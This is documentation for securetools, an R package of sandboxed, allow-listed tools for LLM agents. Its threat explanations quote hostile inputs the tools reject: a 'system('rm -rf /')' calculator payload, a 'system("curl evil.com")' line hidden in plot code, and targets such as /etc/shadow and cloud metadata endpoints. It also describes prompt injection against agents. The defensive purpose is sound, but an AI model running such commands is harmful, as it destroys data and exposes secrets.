title: securetools – Development Guide
text: R package providing pre-built security-hardened tool definitions use securer. tool factory returns securer::securer_tool() object built-security constraints.

title: securetools – Development Guide
text: Tool factories return securer_tool() objects. fn closure captures config (allow-lists, limits, rate limiter). fn runs parent process. Key files: - R/utils-validate.R – Path validation, size limits, SQL identifier checks - R/utils-rate-limit.R – Per-tool invocation rate limiter - R/tool-*.R – One file per tool factory

title: securetools – Development Guide
code: Rscript -e "devtools::test('.')" Rscript -e "devtools::check('.')" Rscript -e "devtools::document('.')"

title: securetools – Development Guide
text: Use withr::local_tempdir() temp directories Use skip_if_not_installed() optional dependencies Use skip_if_no_session() tests requiring SecureSession Test security rejections (path traversal, injection) well happy paths

title: Using securetools with Agents
text: Building AI agent can act real world – reading files, querying databases, calling APIs – requires combining LLM’s reasoning executable tools. challenge LLM’s reasoning probabilistic influenced inputs, means tool can call might called unexpected adversarial ways. Agent frameworks need treat tool access security boundary, just convenience layer. securetools provides pre-built, security-hardened tools plug directly orchestr agents. tool factory returns securer::securer_tool() object orchestr’s Agent class converts ellmer tool automatically secure = TRUE. means get structural security guarantees (path scoping, parameterized SQL, rate limiting) without writing security code – tools enforce constraints design. vignette shows wire securetools single-agent ReAct loops, multi-agent supervisor graphs, mixed toolkits. tool factory basics, see vignette("securetools"). orchestr fundamentals, see vignette("quickstart", package = "orchestr").

title: Using securetools with Agents
code: library(securetools) library(orchestr) library(ellmer)  # Set your LLM provider API key Sys.setenv(ANTHROPIC_API_KEY = "your-key-here")

title: Using securetools with Agents
text: ReAct (Reason + Act) agent foundational pattern tool-using LLMs. agent receives task, reasons next, acts calling tool, observes result, repeats cycle can formulate final answer. loop powerful inherently risky: iteration gives LLM another chance call tool, confused manipulated agent can spiral unbounded tool use. securetools makes ReAct loops safe ensuring every tool call passes parent-process validation reaching sandbox. LLM can reason freely, actions constrained structural guarantees tool. following diagram shows execution flow ReAct agent securetools: Pass securetools agent() constructor secure = TRUE tool calls run inside securer sandbox. secure = TRUE, orchestr creates SecureSession behind scenes. securer_tool converted ellmer tool definition executes inside sandbox. Path scoping, AST validation, rate limits still apply parent-process level.
code: ┌───────────────────────────────────────────────────┐   │                   ReAct Loop                      │   │                                                   │   │   ┌──────────┐    ┌──────────┐    ┌───────────┐   │   │   │          │    │          │    │           │   │   │   │  Reason  │───>│   Act    │───>│  Observe  │   │   │   │  (LLM)   │    │ (tool)   │    │ (result)  │   │   │   │          │    │          │    │           │   │   │   └──────────┘    └────┬─────┘    └─────┬─────┘   │   │        ^               │                │         │   │        │               v                │         │   │        │        ┌──────────────┐        │         │   │        │        │   Validate   │        │         │   │        │        │  (parent R)  │        │         │   │        │        │  - rate limit│        │         │   │        │        │  - allow-list│        │         │   │        │        │  - path check│        │         │   │        │        └──────┬───────┘        │         │   │        │               v                │         │   │        │        ┌──────────────┐        │         │   │        │        │   Execute    │        │         │   │        │        │  (sandbox)   │────────┘         │   │        │        └──────────────┘                  │   │        │                                          │   │        └──────────── loop ────────────────────────┘   │                                                   │   │   Done? ──yes──> Return final answer              │   └───────────────────────────────────────────────────┘ # Create security-scoped tools calc <- calculator_tool() reader <- read_file_tool(allowed_dirs = "/path/to/project/data")  # Build an agent with tools and secure execution analyst <- agent(   "analyst",   chat = chat_anthropic(     system_prompt = "You are a data analyst. Use your tools to answer questions."   ),   tools = list(calc, reader),   secure = TRUE )  # Wrap in a ReAct graph for state management graph <- react_graph(analyst)  result <- graph$invoke(list(messages = list(   "Read the file sales.csv from the data directory and calculate the total revenue." )))

title: Using securetools with Agents
text: supervisor pattern multi-agent equivalent principle least privilege. Instead giving one agent tools (calculator, file /O, SQL, HTTP), create specialist workers carry tools need. supervisor agent routes incoming requests appropriate worker without direct tool access. architecture several security benefits. First, worker gets SecureSession, rate limits, allowed directories, domain allow-lists isolated per worker. compromised confused file worker suddenly start making HTTP requests. Second, supervisor sees high-level results workers, raw tool outputs, limits information leakage agent boundaries. Third, tool-level constraints can tuned per-role: data specialist might generous rate limits file writer tightly capped. supervisor graph routes tasks specialized worker agents. worker carries set tools. supervisor decides worker invoke based user’s request. supervisor need tools – uses route tool supervisor_graph() injects automatically. Workers get SecureSession, tool-level constraints (allowed directories, rate limits) isolated per worker.
code: ┌─────────────────────────────────────────────────┐   │                 Supervisor Agent                 │   │           (no tools, routes only)                │   │                                                  │   │    "Read sales.csv, compute mean revenue"        │   │                                                  │   │         ┌──────────┬──────────┐                  │   │         v          v          v                  │   │   ┌───────────┐ ┌──────────┐ ┌──────────────┐   │   │   │   File    │ │  Data    │ │  Research    │   │   │   │ Specialist│ │Specialist│ │  Specialist  │   │   │   │           │ │          │ │              │   │   │   │ read_file │ │calculator│ │  fetch_url   │   │   │   │ write_file│ │ profiler │ │              │   │   │   └───────────┘ └──────────┘ └──────────────┘   │   │                                                  │   │   Each worker has its own SecureSession          │   │   with isolated rate limits and allow-lists      │   └─────────────────────────────────────────────────┘ # Data agent: calculation and profiling data_agent <- agent(   "data_specialist",   chat = chat_anthropic(     system_prompt = paste(       "You are a data specialist.",       "Use the calculator for arithmetic and the profiler for data summaries."     )   ),   tools = list(     calculator_tool(),     data_profile_tool(max_rows = 50000)   ),   secure = TRUE )  # File agent: reading and writing file_agent <- agent(   "file_specialist",   chat = chat_anthropic(     system_prompt = paste(       "You are a file specialist.",       "Read and write files as requested.",       "Always specify format = 'auto' when reading."     )   ),   tools = list(     read_file_tool(allowed_dirs = "/path/to/project/data"),     write_file_tool(allowed_dirs = "/path/to/project/output")   ),   secure = TRUE )  # Supervisor routes between specialists supervisor <- agent(   "supervisor",   chat = chat_anthropic(     system_prompt = paste(       "You coordinate a team.",       "Route data questions to the data specialist",       "and file operations to the file specialist."     )   ) )  graph <- supervisor_graph(   supervisor = supervisor,   workers = list(     data_specialist = data_agent,     file_specialist = file_agent   ) )  result <- graph$invoke(list(messages = list(   "Read sales.csv, then calculate the mean of the revenue column." )))

title: Using securetools with Agents
text: Rate limiting especially critical agent loops LLM controls many iterations occur. ReAct agent misunderstands task might call calculator 500 times trying “verify” answer. research agent fetching URLs might follow links recursively, hammering external API. Without hard caps, agent loops can spiral runaway execution wastes tokens, exhausts rate limits external services, generates enormous output overwhelms downstream processing. securetools provides two complementary rate limiting mechanisms: Lifetime caps (max_calls): total number times tool can invoked across entire session. hit, every subsequent call returns error. backstop runaway loops. Sliding window (max_calls_per_minute): Limits burst frequency. Even allow 1000 lifetime calls, restricting 10 per minute prevents overwhelming external services disk /O. rate limit reached, tool returns structured error message LLM (R exception), giving agent chance adjust strategy – example, summarizing far instead fetching data. rate limit hit, tool returns error message LLM, can decide stop adjust approach. prevents runaway costs accidental API abuse.
code: # Cap the calculator at 50 calls per agent session calc <- calculator_tool(max_calls = 50)  # URL fetch with both lifetime and per-minute limits fetcher <- fetch_url_tool(   allowed_domains = c("api.github.com"),   max_calls = 100,   max_calls_per_minute = 10 )  researcher <- agent(   "researcher",   chat = chat_anthropic(     system_prompt = "You fetch data from APIs and analyze results."   ),   tools = list(calc, fetcher),   secure = TRUE )  graph <- react_graph(researcher)

title: Using securetools with Agents
text: Real-world agents often need capabilities beyond securetools provides box. can combine securetools factories custom securer::securer_tool() definitions agent. tools – securetools custom – run inside secure session benefit sandbox isolation. Custom tools follow security model securetools factories: fn runs parent process (inside sandbox), orchestr handles ellmer conversion automatically.
code: # A custom tool alongside securetools timestamp_tool <- securer::securer_tool(   name = "timestamp",   description = "Return the current UTC timestamp.",   fn = function() {     format(Sys.time(), tz = "UTC", usetz = TRUE)   },   args = list() )  # Mix custom + securetools assistant <- agent(   "assistant",   chat = chat_anthropic(     system_prompt = "You help with data tasks and can check the current time."   ),   tools = list(     calculator_tool(),     read_file_tool(allowed_dirs = "/path/to/data"),     timestamp_tool   ),   secure = TRUE )  graph <- react_graph(assistant)  result <- graph$invoke(list(messages = list(   "What time is it? Also, what is 2^10?" )))

title: Getting Started with securetools
text: give LLM agent access tools, handing executable capabilities system trained helpful – safe. model can call system() can run arbitrary shell commands. model unrestricted file write can overwrite /etc/passwd plant reverse shell. model raw SQL access can DROP TABLE users exfiltrate every row production database. theoretical risks. Research prompt injection adversarial tool use demonstrated LLM agents follow carefully-crafted instructions embedded untrusted data – user-uploaded CSV, web page fetched agent, even crafted column name database result. tools available agent inherent safety boundaries, single successful injection can compromise host system. securetools addresses providing pre-built tool definitions security constraints structural, advisory. Instead telling model “please read files directory,” tool physically access files outside allowed directories. Instead hoping model avoid SQL injection, tool accepts structured parameters constructs parameterized queries internally. agent never sees raw SQL, raw file paths outside sandbox, unrestricted HTTP access. Security enforced tool, requested model.

title: Getting Started with securetools
text: securetools provides pre-built, security-hardened tool definitions use securer. tool factory returns securer::securer_tool() object built-constraints: path scoping, parameterized SQL, domain allow-lists, size limits, rate limiting.

title: Getting Started with securetools
text: Every securetools call follows execution flow. Understanding flow key understanding security model robust – validation happens parent process, sandbox influence. crucial insight: validation runs parent process, sandboxed code modify bypass. Even sandbox escape possible, parent-level checks (path scoping, rate limits, SQL parameterization) still apply execute call ever reaches sandbox.
code: LLM Agent                 Parent Process (R)              Sandbox (securer)   =========                 ==================              =================       |                            |                               |       |--- tool_call(args) ------->|                               |       |                            |                               |       |                     1. Validate args:                      |       |                        - Check rate limit                  |       |                        - Resolve symlinks                  |       |                        - Match allow-lists                 |       |                        - Verify size limits                |       |                            |                               |       |                     2. Reject? -----> Error to LLM         |       |                            |                               |       |                     3. Pass validated -------> Execute     |       |                        call to sandbox         in sandbox  |       |                            |                               |       |                            |<------------- Result ---------|       |                            |                               |       |<--- result/error ----------|                               |

title: Getting Started with securetools
code: # install.packages("pak") pak::pak("ian-flores/securetools")

title: Getting Started with securetools
code: library(securetools) library(securer)

title: Getting Started with securetools
text: threat: LLM asked “calculate” something might generate arbitrary R code instead simple arithmetic expression. Without validation, calculator(expression = "system('rm -rf /')") execute destructive shell command. Code injection expression evaluation one oldest dangerous attack vectors. calculator tool evaluates mathematical expressions safely via AST validation. parses expression abstract syntax tree walks every node, verifying arithmetic operators, math functions, numeric literals present. Variable access, assignment, arbitrary function calls rejected evaluation ever occurs.
code: calc <- calculator_tool() session <- SecureSession$new(tools = list(calc))  session$execute('calculator(expression = "sqrt(144) + 2^3")') #> [1] 20  # This is rejected -- system() is not an allowed function: session$execute('calculator(expression = "system(\'whoami\')")') #> Error: Function not allowed in calculator: `system`  session$close()

title: Getting Started with securetools
text: threat: agent unrestricted file access can read secrets (~/.ssh/id_rsa, .env files, /etc/shadow) write sensitive locations. Path traversal attacks using ../../ sequences symlinks let attacker escape intended directory. agent might also exhaust disk space writing extremely large files loop. File /O tools enforce path scoping symlink resolution, size limits, directory allow-lists. Reading writing scoped independently can give agent read access source data without granting write access directory:
code: # Only allow access to a specific directory data_dir <- "/path/to/project/data"  reader <- read_file_tool(   allowed_dirs = data_dir,   max_file_size = "50MB",   max_rows = 10000 )  writer <- write_file_tool(   allowed_dirs = data_dir,   max_file_size = "10MB",   overwrite = FALSE )  session <- SecureSession$new(tools = list(reader, writer))  # Read a CSV -- auto-detects format from extension session$execute('   data <- read_file(path = "/path/to/project/data/input.csv", format = "auto")   head(data) ')  # Write results -- path traversal is blocked session$execute('   result <- data.frame(x = 1:5, y = letters[1:5])   write_file(     path = "/path/to/project/data/output.csv",     content = result,     format = "csv"   ) ')  session$close()

title: Getting Started with securetools
text: threat: SQL injection among well-known devastating attack classes. LLM given raw SQL interface can tricked (via prompt injection user data fetched content) running DROP TABLE, UNION SELECT data exfiltration, INSERT/UPDATE tamper records. Traditional parameterized queries help, still require developer use correctly. securetools takes radical approach: agent never writes SQL . query_sql_tool() provides structured interface agent specifies table name, column list, optional filter. tool constructs SQL internally using parameterized queries. Injection merely mitigated – structurally impossible agent mechanism supply raw SQL strings: table column names validated allow-lists. pre-approved tables can queried, column names checked SQL injection patterns interpolated query.
code: Agent Request                           Tool Internals   =============                           ==============   table = "users"             --->   SELECT name, email   columns = "name, email"           FROM users   filter_column = "active"          WHERE active = ?   filter_value = "1"                 [bound: "1"] library(DBI) con <- dbConnect(RSQLite::SQLite(), "app.db")  sql_tool <- query_sql_tool(    conn = con,   allowed_tables = c("users", "orders"),   max_rows = 1000 )  session <- SecureSession$new(tools = list(sql_tool))  # Query with filter -- uses parameterized query internally session$execute('   query_sql(     table = "users",     columns = "name, email",     filter_column = "active",     filter_value = "1"   ) ')  session$close() dbDisconnect(con)

title: Getting Started with securetools
text: threat: agent unrestricted HTTP access can perform Server-Side Request Forgery (SSRF) – making requests internal services (http://169.254.169.254 cloud metadata, http://localhost:8080 internal APIs) invisible public internet. can also exfiltrate data POSTing attacker-controlled endpoints, overwhelm external APIs unbounded request loops. URL fetch tool constrains network access domain allow-lists (using glob patterns subdomain matching), protocol restrictions (HTTP/HTTPS ), private IP blocking, response size limits, rate limiting:
code: fetcher <- fetch_url_tool(   allowed_domains = c("api.github.com", "*.githubusercontent.com"),   max_response_size = "1MB",   timeout_secs = 30,   max_calls_per_minute = 10 )  session <- SecureSession$new(tools = list(fetcher))  session$execute('   result <- fetch_url(url = "https://api.github.com/zen", method = "GET")   result$body ')  session$close()

title: Getting Started with securetools
text: threat: Profiling enormous datasets without limits can exhaust memory crash host process. data_profile_tool() enforces row limits sampling, ensuring even multi-million-row data frames summarized safely without resource exhaustion. Compute summary statistics data frames:
code: profiler <- data_profile_tool(max_rows = 100000) session <- SecureSession$new(tools = list(profiler))  session$execute('   profile <- data_profile(data = iris)   profile$columns[[1]]  # Sepal.Length stats ')  session$close()

title: Getting Started with securetools
text: threat: R’s plotting system powerful enough execute arbitrary code. expression like plot(x); system("curl evil.com") embeds system call inside looks like plotting code. Without restrictions, plot tool becomes general-purpose code execution backdoor. plot tool evaluates plot expressions restricted environment safe base R graphics functions available. Output also path-scoped size-limited prevent writing oversized files arbitrary locations:
code: plotter <- plot_tool(   allowed_dirs = "/path/to/output",   max_file_size = "5MB" )  session <- SecureSession$new(tools = list(plotter))  session$execute('   plot(     path = "/path/to/output/chart.png",     plot_code = "hist(rnorm(1000), main = \"Distribution\")",     width = 8,     height = 6   ) ')  session$close()

title: Getting Started with securetools
text: threat: Unrestricted documentation lookup might seem harmless, can leak information installed packages system configuration. allowed_packages parameter restricts packages can queried, keeping agent’s awareness scoped intend. r_help_tool() provides safe access R documentation: allowed_packages parameter restricts packages can queried, preventing access documentation packages may appropriate.
code: help_tool <- r_help_tool(allowed_packages = c("base", "stats", "utils"))  session <- SecureSession$new(tools = list(help_tool))  # Look up documentation for a function result <- session$call("r_help", topic = "mean", package = "base") cat(result)  session$close()

title: Getting Started with securetools
text: Every tool enforces constraints parent process level, sandbox. means even sandbox somehow bypassed, tool-level protections still hold: - Path scoping: symlinks resolved checking allowed directories - Parameterized SQL: structured interface prevents injection design - Domain allow-lists: URL validation HTTP request - Size limits: checked serialization (write) processing (read) - Rate limiting: per-tool lifetime /sliding window limits - AST validation: calculator expression safety via recursive AST walking

title: Getting Started with securetools
text: securetools designed protect untrusted LLM agent attempting : Read sensitive files: Path validation symlink resolution prevents directory traversal Write arbitrary locations: Write paths validated allowed directories Execute arbitrary code: Calculator uses AST validation; plot tool restricts plotting functions Access internal services (SSRF): URL fetching validates protocols (HTTP/HTTPS ) blocks private IPs SQL injection: Structured query interface parameterized filters prevents raw SQL injection Resource exhaustion: Rate limiting size limits constrain resource usage

title: Getting Started with securetools
text: TOCTOU races: path validation file /O, symlink theoretically swapped. Use validate_written_path() post-write verification. Rate limiting per-process: Limits reset R process restarts. persistent rate limiting, use external mechanism. DNS rebinding: private IP check resolves DNS request, sophisticated DNS rebinding attacks theoretically bypass . Base R access restricted environments: plot tool’s restricted environment still provides access safe base R functions. allowlist comprehensive may need updates new R versions.

title: Getting Started with securetools
text: tools called SecureSession IPC, tool arguments must specified explicitly. child process wrappers carry default values tool factory. example, always specify format = "auto" even though ’s default direct usage.

title: Getting Started with securetools
text: Agent loops inherently unbounded – ReAct agent keep calling tools decides answer (hits token limit). Without explicit rate limiting, confused manipulated agent make thousands API calls, exhaust disk /O, run cloud costs. Rate limiting provides hard safety boundary independent LLM’s decision-making. tool factories accept max_calls lifetime rate limiting. tools (like fetch_url_tool()) also support max_calls_per_minute sliding-window throttling. limit hit, tool returns error message LLM rather silently failing, giving agent chance adjust strategy:
code: # Allow only 100 calculator evaluations per session calc <- calculator_tool(max_calls = 100)  # URL fetch with both lifetime and per-minute limits fetcher <- fetch_url_tool(   max_calls = 1000,   max_calls_per_minute = 10 )

title: Security-Hardened Tool Library for R LLM Agents
text: LLMs can call system(), write path, run arbitrary SQL. securetools provides pre-built, security-hardened tool wrappers enforce sandboxing, path restrictions, query validation – can give AI agents real capabilities without giving keys kingdom.

title: Security-Hardened Tool Library for R LLM Agents
text: securetools part 7-package ecosystem building governed AI agents R: securetools provides pre-built, security-hardened tool definitions plug directly securer sessions. sits middle layer alongside secureguard securecontext, giving agents safe access files, SQL, URLs, computation.

title: Security-Hardened Tool Library for R LLM Agents
code: # install.packages("pak") pak::pak("ian-flores/securetools")

title: Security-Hardened Tool Library for R LLM Agents
code: library(securetools) library(securer)  # Create tools with security constraints calc <- calculator_tool() reader <- read_file_tool(allowed_dirs = "/data", max_file_size = "50MB") sql <- query_sql_tool(conn = con, allowed_tables = c("users", "orders"))  # Use with SecureSession session <- SecureSession$new(tools = list(calc, reader, sql)) session$execute('calculator(expression = "sqrt(144) + 2^3")') #> [1] 20 session$close()

title: Security-Hardened Tool Library for R LLM Agents
text: Factory functions: read_file_tool(allowed_dirs = "/data") forces explicit security configuration Parent-side enforcement: Tool constraints run host process, sandbox. Even sandbox bypass leaves tool protections intact raw SQL: Structured query interface makes injection structurally impossible Symlink resolution: normalizePath() path prefix check prevents symlink escape AST walking: Calculator validates expression trees, strings

title: Create a calculator tool — calculator_tool
text: Returns securer::securer_tool() evaluates mathematical expressions safely via AST validation.

title: Create a calculator tool — calculator_tool
code: calculator_tool(max_calls = NULL)

title: Create a calculator tool — calculator_tool
text: max_calls Maximum number invocations allowed. NULL (default) means unlimited.

title: Create a calculator tool — calculator_tool
text: securer_tool object.

title: Create a calculator tool — calculator_tool
text: calculator tool evaluates mathematical expressions restricted environment. following functions operators allowed: Arithmetic: +, -, *, /, ^, %%, %/% Math: sqrt, abs, log, log2, log10, exp, ceiling, floor, round, trunc Trigonometry: sin, cos, tan, asin, acos, atan Aggregation: sum, mean, max, min, length Utilities: c, pi Expressions first parsed validated via AST walk rejects function call symbol allowlist. Evaluation occurs minimal environment containing allowed functions, emptyenv() parent prevent access R functionality.

title: Create a calculator tool — calculator_tool
code: if (FALSE) { # \dontrun{ calc <- calculator_tool() # Basic arithmetic calc$fn(expression = "2 + 3 * 4")  # Math functions calc$fn(expression = "sqrt(144) + log(exp(1))")  # With rate limiting calc <- calculator_tool(max_calls = 100) } # }

what: Create a data profiling tool — data_profile_tool

title: Create a data profiling tool — data_profile_tool

title: Create a data profiling tool — data_profile_tool
text: max_rows Maximum rows profile. Larger data frames sampled. Default 100000. max_calls Maximum invocations allowed. NULL (default) means unlimited.

title: Create a data profiling tool — data_profile_tool
text: securer_tool object.

title: Create a data profiling tool — data_profile_tool
text: Computes per-column statistics including type, missing count, unique count. numeric integer columns, also computes min, max, mean, median, standard deviation. character factor columns, returns top 5 frequent values counts. input data frame exceeds max_rows, random sample max_rows rows profiled result indicates sampling occurred. data argument declared type "list" tool schema IPC serialization layer converts data frames lists. tool automatically coerces list input back data frame.

title: Create a data profiling tool — data_profile_tool
code: if (FALSE) { # \dontrun{ tool <- data_profile_tool(max_rows = 50000, max_calls = 10) } # }

what: Create a URL fetch tool — fetch_url_tool
title: Create a URL fetch tool — fetch_url_tool
text: Returns securer::securer_tool() fetches content URLs via HTTP GET/HEAD domain allow-lists rate limiting.

title: Create a URL fetch tool — fetch_url_tool
code: fetch_url_tool(   allowed_domains,   max_response_size = "1MB",   timeout_secs = 30,   max_calls = NULL,   max_calls_per_minute = 10 )

title: Create a URL fetch tool — fetch_url_tool
text: allowed_domains Character vector allowed domains (required). Use *.example.com wildcard subdomains matching subdomain bare domain . max_response_size Maximum response body size. Default "1MB". timeout_secs Request timeout seconds. Default 30. max_calls Maximum lifetime invocations. NULL means unlimited. max_calls_per_minute Maximum invocations per 60-second window. Default 10.

title: Create a URL fetch tool — fetch_url_tool
text: securer_tool object.

title: Create a URL fetch tool — fetch_url_tool
text: tool enforces several layers security: Protocol restriction: http https schemes accepted. protocols (e.g. file://, ftp://) rejected. Private IP blocking: Hostnames resolve private reserved IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x, 0.0.0.0) blocked prevent SSRF attacks. redirect following: HTTP redirects followed, preventing redirect-based SSRF bypasses. Domain allow-list: Every request checked allowed_domains list. Wildcard entries like *.example.com match subdomain (e.g. api.example.com, deep.sub.example.com) bare example.com. Curl-level size limit: maxfilesize curl option caps download max_response_size bytes, additional post-download nchar check backup. Rate limiting: per-minute lifetime invocation limits enforced.

title: Create a URL fetch tool — fetch_url_tool
code: if (FALSE) { # \dontrun{ tool <- fetch_url_tool(   allowed_domains = c("api.example.com", "*.cdn.example.com"),   max_response_size = "512KB",   timeout_secs = 10 ) } # }

what: Create a plot rendering tool — plot_tool
title: Create a plot rendering tool — plot_tool
text: Returns securer::securer_tool() evaluates R plotting code saves result file.

title: Create a plot rendering tool — plot_tool
code: plot_tool(   allowed_dirs,   default_width = 8,   default_height = 6,   max_file_size = "5MB",   max_calls = NULL,   default_dpi = 150 )

title: Create a plot rendering tool — plot_tool
text: allowed_dirs Character vector directories tool can write . default_width Default plot width inches. Default 8. default_height Default plot height inches. Default 6. max_file_size Maximum output file size. Default "5MB". max_calls Maximum invocations. NULL means unlimited. default_dpi Default resolution dots per inch raster formats (png, jpg). Default 150.

title: Create a plot rendering tool — plot_tool
text: securer_tool object.

title: Create a plot rendering tool — plot_tool
text: plot tool evaluates R plotting code restricted environment. evaluation, AST walk validates allowed functions called, preventing arbitrary code execution. following categories functions permitted: Graphics: plot, lines, points, abline, hist, barplot, boxplot, curve, title, legend, axis, mtext, text, par, grid, segments, arrows, polygon, rect, symbols, pie, pairs, heatmap, image, contour, persp, stripchart, dotchart, stars, sunflowerplot, coplot, cdplot, fourfoldplot, mosaicplot, assocplot, smoothScatter, spineplot, stem Helpers: mathematical functions (sqrt, log, exp, etc.), string functions (paste, sprintf, etc.), statistical distributions (dnorm, rnorm, etc.) Data manipulation: data.frame, list, matrix, lapply, sapply, subset, , others Operators: arithmetic, comparison, logical operators Flow control: , , , {, assignment Supported output formats: png, pdf, svg, jpg/jpeg. format auto-detected file extension default.

title: Create a plot rendering tool — plot_tool
code: if (FALSE) { # \dontrun{ plt <- plot_tool(allowed_dirs = tempdir()) # Basic scatter plot plt$fn(   path = file.path(tempdir(), "scatter.png"),   plot_code = "plot(1:10, rnorm(10), main = 'Example')" )  # With custom dimensions and DPI plt <- plot_tool(   allowed_dirs = tempdir(),   default_width = 10,   default_height = 8,   default_dpi = 300 ) } # }

what: Create a SQL query tool — query_sql_tool
title: Create a SQL query tool — query_sql_tool
text: Returns securer::securer_tool() queries database tables via structured interface parameterized queries. raw SQL accepted – makes SQL injection structurally impossible.

title: Create a SQL query tool — query_sql_tool
code: query_sql_tool(conn, allowed_tables, max_rows = 1000, max_calls = NULL)

title: Create a SQL query tool — query_sql_tool
text: conn DBI connection object. allowed_tables Character vector table names tool can query. max_rows Maximum rows returned. Default 1000. max_calls Maximum invocations. NULL means unlimited.

title: Create a SQL query tool — query_sql_tool
text: securer_tool object.

title: Create a SQL query tool — query_sql_tool
text: Security constraints: Structured SELECT : tool constructs SELECT queries structured arguments. raw SQL accepted, making SQL injection structurally impossible. Parameterized filters: Filter values passed query parameters, never interpolated SQL strings. Identifier quoting: Table column names quoted DBI::dbQuoteIdentifier() passing allow-list validation, providing defense depth. Table allow-list: tables listed allowed_tables can queried.

title: Create a SQL query tool — query_sql_tool
code: if (FALSE) { # \dontrun{ tool <- query_sql_tool(   conn = DBI::dbConnect(RSQLite::SQLite(), ":memory:"),   allowed_tables = c("customers", "orders"),   max_rows = 500 ) } # }

what: Create an R help documentation tool — r_help_tool
title: Create an R help documentation tool — r_help_tool
text: Returns securer::securer_tool() looks R function documentation set allowed packages.

title: Create an R help documentation tool — r_help_tool
code: r_help_tool(   allowed_packages = c("base", "stats", "utils", "methods", "grDevices", "graphics",     "datasets"),   max_lines = 100,   max_calls = NULL )

title: Create an R help documentation tool — r_help_tool
text: allowed_packages Character vector packages tool can look documentation . Default includes base R packages. max_lines Maximum lines help text return. Default 100. max_calls Maximum invocations. NULL means unlimited.

title: Create an R help documentation tool — r_help_tool
text: securer_tool object.

title: Create an R help documentation tool — r_help_tool
text: tool restricts documentation lookup packages specified allowed_packages. topic name package name must provided; package must allow-list. Help text rendered plain text via tools::Rd2txt() truncated max_lines lines.

title: Create an R help documentation tool — r_help_tool
code: if (FALSE) { # \dontrun{ tool <- r_help_tool(   allowed_packages = c("base", "stats", "utils"),   max_lines = 200 ) } # }

what: Create a file reading tool — read_file_tool
title: Create a file reading tool — read_file_tool
text: Returns securer::securer_tool() reads files specified directories format detection size limits.

title: Create a file reading tool — read_file_tool
code: read_file_tool(   allowed_dirs,   max_file_size = "50MB",   max_rows = 10000,   max_calls = NULL )

title: Create a file reading tool — read_file_tool
text: allowed_dirs Character vector directories tool can read . max_file_size Max file size. Default "50MB". Accepts bytes string like "10MB". max_rows Maximum rows tabular formats. Default 10000. max_calls Maximum invocations. NULL means unlimited.

title: Create a file reading tool — read_file_tool
text: securer_tool object.

title: Create a file reading tool — read_file_tool
text: Supported formats: csv, json, txt, xlsx, parquet, rds. Format detected automatically file extension, can specified explicitly via format argument. Security measures: Path validation: paths resolved via base::normalizePath() checked allowed_dirs. Symlinks resolved directory check, preventing symlink-based escapes. RDS sandboxing: RDS files deserialized separate subprocess via callr, isolating main process malicious objects execute code load. Size limits: Files exceeding max_file_size rejected reading. Row limits: Tabular formats (csv, xlsx) capped max_rows rows.

title: Create a file reading tool — read_file_tool
code: if (FALSE) { # \dontrun{ tool <- read_file_tool(   allowed_dirs = c("/data/reports", "/data/exports"),   max_file_size = "10MB",   max_rows = 5000 ) } # }

what: securetools: Security-Hardened Tool Definitions for securer — securetools-package
title: securetools: Security-Hardened Tool Definitions for securer — securetools-package
text: Provides pre-built, security-hardened tool definitions use securer package. tool factory returns securer::securer_tool() object built-security constraints path validation, allow-lists, rate limiting, parameterized queries.

title: securetools: Security-Hardened Tool Definitions for securer — securetools-package
text: Maintainer: Ian Flores Siaca iflores.siaca@hey.com

what: Create a file writing tool — write_file_tool
title: Create a file writing tool — write_file_tool
text: Returns securer::securer_tool() writes data files specified directories size limits overwrite protection.

title: Create a file writing tool — write_file_tool
code: write_file_tool(   allowed_dirs,   max_file_size = "10MB",   max_calls = NULL,   overwrite = FALSE )

title: Create a file writing tool — write_file_tool
text: allowed_dirs Character vector directories tool can write . max_file_size Max output file size. Default "10MB". max_calls Maximum invocations. NULL means unlimited. overwrite Whether allow overwriting existing files. Default FALSE.

title: Create a file writing tool — write_file_tool
text: securer_tool object.

title: Create a file writing tool — write_file_tool
text: content argument type declared "list" tool schema IPC serialization layer (JSON) converts R objects lists. practice, callers pass: data.frame CSV JSON formats character vector TXT format R object RDS format Supported formats: csv, json, txt, rds. Format auto-detected file extension, can specified explicitly. Security constraints: Atomic writes: Data written temp file first, validated size, moved target path. Overwrite protection: default, existing files overwritten (controlled overwrite parameter). Symlink resolution: Target paths resolved via base::normalizePath() prevent symlink-based directory escapes. Size limits: Written files exceeding max_file_size rejected moved target.

title: Create a file writing tool — write_file_tool
code: if (FALSE) { # \dontrun{ tool <- write_file_tool(   allowed_dirs = "/data/exports",   max_file_size = "5MB",   overwrite = FALSE ) } # }

title: securetools 0.1.0
text: read_file_tool() – Sandboxed file reading path validation write_file_tool() – Sandboxed file writing size limits calculator_tool() – Safe expression evaluation AST validation query_sql_tool() – Structured SQL queries parameterized filters fetch_url_tool() – HTTP fetching domain allowlists SSRF protection plot_tool() – Plot generation restricted code evaluation data_profile_tool() – Dataset profiling summary statistics r_help_tool() – R documentation lookup package restrictions Internal validation utilities path safety, SQL identifiers, rate limiting Comprehensive test suite covering security rejection paths Vignette usage examples security model documentation
